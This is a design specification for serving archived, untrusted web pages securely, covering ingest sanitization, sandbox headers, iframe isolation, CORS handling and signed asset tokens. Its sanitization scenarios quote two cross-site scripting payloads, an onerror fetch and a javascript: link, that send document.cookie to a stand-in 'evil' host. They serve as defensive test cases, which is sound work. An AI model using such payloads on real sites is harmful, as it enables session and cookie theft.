# Archived HTML Serving Specification

## Purpose

Defense-in-depth serving of archived (untrusted) HTML: ingest-time sanitization, sandboxed serving headers on every route that delivers archived content, and origin-isolated viewer iframes in both the public share viewer and the logged-in viewer.

## Requirements

### Requirement: Sanitization at ingest

The archive service SHALL sanitize archived HTML at ingest: `<script>` elements SHALL be removed, `on*` event-handler attributes SHALL be stripped from all elements, and URI-bearing attributes (`href`, `src`, `action`, `formaction`, `xlink:href`) SHALL have `javascript:` and `data:text/html` values neutralized (rewritten to an inert value or the attribute dropped). Sanitization SHALL run before the HTML is persisted to R2, so no stored page contains executable script payload.

#### Scenario: Inline event handler is removed

- **WHEN** archived HTML contains `<img src="a.png" onerror="fetch('//evil?t='+document.cookie)">`
- **THEN** the stored HTML contains no `onerror` attribute
- **AND** the `src` is preserved

#### Scenario: javascript: URI is neutralized

- **WHEN** archived HTML contains `<a href="javascript:document.location='//evil/'+document.cookie">x</a>`
- **THEN** the stored HTML does not execute the payload when the link is clicked in the viewer
- **AND** the anchor text is preserved

#### Scenario: Legitimate content survives sanitization

- **WHEN** archived HTML contains standard markup, inline styles, images, and forms
- **THEN** sanitization removes nothing except scripts, event handlers, and dangerous URIs
- **AND** the page renders as captured in the sandboxed viewer

### Requirement: Sandboxed serving headers for archived content

Every route that serves archived HTML or assets on the `pagepocket.app` origin — the gateway file routes (`/api/v1/share/public/{token}/f/*`, `/api/v1/archive/pages/{page_id}/f/*`) and the frontend proxy routes that forward them (`/api/sc/*`, `/api/pp/archive/*/f/*`) — SHALL itself emit the full sandbox header set: a sandboxing `Content-Security-Policy` (`sandbox allow-popups allow-forms`, explicitly without `allow-same-origin`), `X-Content-Type-Options: nosniff`, and the stored content type. The frontend proxies SHALL NOT rely on the gateway's headers alone — the browser sees only the proxy's response, so each proxy emits the same header set on its own response. HTML responses SHALL additionally set `Referrer-Policy: no-referrer`.

#### Scenario: Archived HTML served without origin privileges

- **WHEN** a viewer fetches a page's `index.html` through any serving route
- **THEN** the response carries `Content-Security-Policy: sandbox allow-popups allow-forms`
- **AND** scripts, if any were stored, cannot access pagepocket.app cookies, storage, or DOM

#### Scenario: Frontend proxy preserves sandbox headers

- **WHEN** the frontend route proxies a gateway file response
- **THEN** the proxy emits the sandbox CSP and `nosniff` headers on its own response, equivalent to the gateway's
- **AND** the proxy does not serve archived content without them

#### Scenario: Assets are served with their stored content type

- **WHEN** an archived image or stylesheet is fetched through a serving route
- **THEN** the response content type matches the stored asset content type
- **AND** `X-Content-Type-Options: nosniff` prevents MIME confusion

### Requirement: Viewer iframes are origin-isolated in BOTH viewers

Origin isolation SHALL cover every viewer that renders archived HTML: the public share viewer (`PublicViewerShell`, serving `/api/sc/{token}/index.html`) AND the logged-in viewer (`PageViewerShell`, serving `/api/pp/archive/{page_id}/f/index.html`). Each viewer's iframe sandbox attribute SHALL omit `allow-same-origin`, MAY retain `allow-popups` and `allow-forms` only where the product requires them, and SHALL NOT grant scripting to the archived document. Logged-in viewing carries the same untrusted-content risk as public sharing: the product archives arbitrary web pages, so a user can ingest attacker-controlled HTML into their own archive and then view it — same-origin privileges on the application origin would turn any script gap into account takeover.

#### Scenario: Archived page cannot reach the application origin

- **WHEN** a user views an archived page in either the public share viewer or the logged-in viewer shell
- **THEN** the iframe sandbox excludes `allow-same-origin`
- **AND** code in the archived page (if it somehow executes) obtains no access to the pagepocket.app origin

#### Scenario: Logged-in viewer matches the public viewer's isolation

- **WHEN** the logged-in viewer (`PageViewerShell`) renders a page the user archived — including one ingested from attacker-controlled HTML
- **THEN** its sandbox attribute is identical to the public viewer's (`allow-popups allow-forms`, no `allow-same-origin`)
- **AND** the nested sandbox intersection with the serving route's CSP sandbox yields a unique opaque origin for the archived document

#### Scenario: Viewer still functions without same-origin

- **WHEN** an archived page renders in the sandboxed iframe
- **THEN** navigation between archived pages, form controls, and assets resolve within the sandbox as designed

### Requirement: Opaque-origin viewer CORS on archived-file responses

The sandboxed viewer iframe grants archived documents an opaque origin (the string `null`), so their CORS-mode subresource loads (webfonts always; css/js/img carrying preserved `crossorigin` tags) can never match the gateway's origin allow-list. The two archived-file proxies — `/api/pp/[...path]` when the upstream is the archive page-file route (upstream path containing `/f/`) and `/api/sc/{token}/[...path]` — SHALL, on successful file responses, echo the request's `Origin` header verbatim (including the literal string `null`) into `Access-Control-Allow-Origin`, and SHALL add `Access-Control-Allow-Credentials: true` and `Vary: Origin`. Requests without an `Origin` header SHALL receive no CORS headers, and non-file API responses proxied by either route SHALL never receive `Access-Control-Allow-Origin`. The gateway's CORS allow-list is intentionally unchanged: it never matches `null` and never emits wildcards.

#### Scenario: Sandboxed viewer subresource from origin null is allowed

- **WHEN** the sandboxed viewer iframe (opaque origin `null`) fetches an archived font, stylesheet, script, or image through either file proxy with `Origin: null`
- **THEN** the response carries `Access-Control-Allow-Origin: null`, `Access-Control-Allow-Credentials: true`, and `Vary: Origin`
- **AND** the browser loads the subresource and the archived page renders with its fonts, styles, images, and scripts as stored

#### Scenario: Non-file API responses gain no CORS headers

- **WHEN** a request with an `Origin` header is proxied to a non-file gateway API route (e.g. `POST /api/pp/api/v1/share`)
- **THEN** the response carries no `Access-Control-Allow-Origin` header
- **AND** the BFF's JSON API surface stays browser-internal

#### Scenario: No Origin header gets no CORS headers

- **WHEN** a file is fetched through either proxy without an `Origin` header (e.g. top-level navigation)
- **THEN** the response carries no `Access-Control-Allow-Origin`, `Access-Control-Allow-Credentials`, or `Vary: Origin` headers
- **AND** the sandbox header set is unchanged

#### Scenario: Sandbox isolation is not relaxed

- **WHEN** any archived-file response is served with the CORS echo
- **THEN** the `Content-Security-Policy: sandbox allow-popups allow-forms` header set is still present and `allow-same-origin` remains excluded

### Requirement: Credential-less archived asset access

CORS echoing alone cannot unblock the sandboxed viewer: CORS-mode subresource loads cannot send cookies at all (per the fetch spec), so cookie-only authentication on the archived-file route fails those loads permanently. The BFF SHALL therefore mint a signed asset token — `payload_b64url + "." + mac_b64url`, where payload is compact JSON `{"p": page_id, "u": user_id, "e": exp_epoch}` base64url-encoded without padding and `mac` is HMAC-SHA256 keyed by the DEDICATED `ASSET_TOKEN_SECRET` (never `JWT_SECRET`) over the encoded payload string — with bucketed expiry `e = (floor(now/TTL) + 2) * TTL`, TTL defaulting to 604800 seconds. When the archived-file proxy serves a `text/html` file response to an authenticated viewer, it SHALL inject that token as a PATH segment into the document's archived-file URLs — `/api/pp/archive/pages/{page_id}/f/X` becomes `/api/pp/archive/pages/{page_id}/f/at/{token}/X` for BOTH absolute app URLs and root-relative ones — rewriting only THIS page's URLs, idempotently (never `/f/at/at/`), and never modifying css/js/img bytes (relative references inside CSS inherit the token segment as part of the path). Rewritten HTML responses SHALL carry `Cache-Control: private, no-cache` so each view picks up the current bucket's token. The gateway SHALL accept cookie OR a valid token on the archive page-file route and SHALL reject expired, foreign-page, foreign-user, or bad-MAC tokens like a missing credential. With `ASSET_TOKEN_SECRET` unset or empty the feature SHALL be OFF: HTML is served byte-identical to the un-rewritten behavior. Tokens SHALL NOT be logged.

#### Scenario: Sandboxed viewer subresources load without cookies

- **WHEN** the logged-in viewer opens an archived page in the sandboxed iframe and the feature is on
- **THEN** the served HTML's `/api/pp/archive/pages/{page_id}/f/` asset URLs carry `/f/at/{token}/`, the document response carries `Cache-Control: private, no-cache`, and the css/js/img/font subresources load without cookies (CORS-mode included)
- **AND** non-HTML asset bytes are served unchanged and the same view within the bucket mints the same token

#### Scenario: Invalid, expired, or foreign tokens are rejected

- **WHEN** the archive page-file route receives a request whose token fails HMAC verification, whose `e` has passed, or whose (p, u) does not match the requested page and owner
- **THEN** the request is rejected with 401 exactly like a missing credential
- **AND** a request carrying the owner's valid session cookie is unaffected by token validation

#### Scenario: Feature off serves HTML unchanged

- **WHEN** `ASSET_TOKEN_SECRET` is unset or empty
- **THEN** no token is minted, the served HTML is byte-identical to the un-rewritten behavior, and its cache-control handling is unchanged

### Requirement: Stylesheet and script references resolve to stored assets

The archived HTML's stylesheet, script, and preload references SHALL point at the resources exactly as they are stored. When the assembler rewrites stylesheet/script/preload URLs (assembler conversion pass in the monolith), each reference SHALL be resolved through the storage path map seeded from the session's stored resources (resource `original_url` → `local_path`) and SHALL emit the exact stored asset path for that resource's original URL (map-hit — e.g. `styles/wp-content/themes/x/css/bootstrap_f553b9a5.css` for a `?ver=`-queried source URL), never a legacy basename fallback (`styles/<basename>.css`). Resources lacking an `original_url` or `local_path` are skipped by the seed and keep the existing fallback; image entries already present in the extension-uploaded filename map remain authoritative, and collision-deduplicated paths (3.7) are rewritten to their final archive paths exactly as for image entries.

#### Scenario: WordPress-style stylesheet resolves to its stored path

- **WHEN** an archived page's HTML references a stylesheet whose source URL carries a query string and a nested path (e.g. `https://site/wp-content/themes/x/css/bootstrap.css?ver=6.4.2`) and the resource is stored at `styles/wp-content/themes/x/css/bootstrap_f553b9a5.css`
- **THEN** the assembled HTML's `<link rel="stylesheet">` href is that exact stored path (archive-relative), not `styles/bootstrap.css`
- **AND** the same holds for `<script src>` and preload/modulepreload links referencing stored scripts and styles

#### Scenario: Stored assets and references stay consistent through collision dedup

- **WHEN** the assembler's deterministic collision dedup (3.7) renames a colliding resource's archive path
- **THEN** the seeded reference for that resource's URL is rewritten to the final (suffixed) archive path like any image-map entry
- **AND** every emitted reference still resolves to a file present in the assembled archive

### Requirement: Absolute source URLs stored for stylesheet, script, and document uploads

Fix F's map seed keys on `resources.original_url`, so that column must carry the real source URL for every reference kind. When the extension uploads a stylesheet, script, or document resource, it SHALL pass the resolved ABSOLUTE source URL (the exact `resolveResourceUrl` result, query string included) as the upload's `originalUrl`, so `resources.original_url` carries that absolute URL and never falls back to the local archive path. The session filename map the extension uploads SHALL cover stylesheets, scripts, and documents in addition to images: every uploaded resource of those kinds SHALL appear keyed BOTH by its raw as-authored attribute AND by its absolute resolved URL, each mapping to the stored archive path (query-queried files at their `<name>_<hash8>` paths). Map merging SHALL keep image entries authoritative — later categories are added only for keys not already present. Linked-page asset processing SHALL feed the same merged map into the incremental (delta) filename-map uploads.

#### Scenario: Queried stylesheet upload produces map entry and original_url

- **WHEN** a page referencing `<link href="https://site/wp-content/a/b/styles.css?ver=9">` is downloaded and the stylesheet is uploaded at `styles/wp-content/a/b/styles_<hash8>.css`
- **THEN** the stored resource's `original_url` is the absolute URL `https://site/wp-content/a/b/styles.css?ver=9` (query included), not the archive path
- **AND** the session filename map contains an entry from that absolute URL — and from the raw attribute as authored — to `styles/wp-content/a/b/styles_<hash8>.css`, so the assembled HTML's `<link>` href resolves through the map instead of the basename fallback

#### Scenario: Filename map and resume manifest cover all asset kinds

- **WHEN** the main page's assets finish uploading (or a linked page's incremental delta is uploaded), and later a service-worker death triggers a checkpoint resume
- **THEN** the uploaded filename map includes stylesheet, script, and document entries alongside image entries with image entries kept on key conflicts, and the checkpoint manifest's css/js entries carry absolute source URLs the resume path can re-fetch directly
